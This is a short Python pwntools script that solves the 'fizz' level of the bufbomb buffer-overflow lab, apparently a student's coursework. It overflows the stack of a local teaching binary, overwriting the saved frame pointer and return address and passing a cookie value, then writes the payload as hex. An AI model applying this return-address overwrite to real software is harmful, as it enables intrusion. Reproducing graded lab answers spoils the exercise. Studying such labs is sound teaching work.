from pwn import *

with open('./ID', 'r') as f:
    id = f.read().splitlines()[0]

sh = process(['./bufbomb', '-u', id])

length = 32
ret = 0x08048cc0
cookie = 0x274adc8a
ebp = 0x556834a0

exploit = flat(['a' * (length + 8), ebp, ret, cookie])

with open('./fizz_{}.txt'.format(id), 'w') as f:
    f.write(' '.join(char.encode('hex') for char in exploit))

sh.sendline(exploit)

sh.interactive()
